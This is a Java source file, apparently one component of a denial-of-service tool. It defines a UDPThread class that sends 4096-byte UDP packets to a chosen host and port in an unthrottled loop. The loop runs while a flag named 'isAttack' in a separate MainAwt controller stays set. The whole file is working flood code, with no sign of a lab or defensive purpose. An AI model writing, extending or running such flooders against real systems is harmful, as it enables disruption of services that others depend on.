package Test;

import java.io.IOException;
import java.net.*;

public class UDPThread implements Runnable
{
 DatagramSocket ds;
 DatagramPacket dp;
 byte[] buf=new byte[8192];
 public UDPThread(InetAddress destination,int port)
 {
  try
  {
   ds=new DatagramSocket();
  }
  catch (SocketException e)
  {
   e.printStackTrace();
  }
  dp=new DatagramPacket(buf,0,4096,destination,port);
 }
 @Override
 public void run()
 {
  synchronized(this)
  {
   if(MainAwt.isAttack==false)
    ds.close();
   else
   {
    while(MainAwt.isAttack==true && MainAwt.isReach==true)
    {
     try
     {
      ds.send(dp);
     }
     catch (IOException e)
     {
      e.printStackTrace();
     }
    } 
   }
  }
 }
}
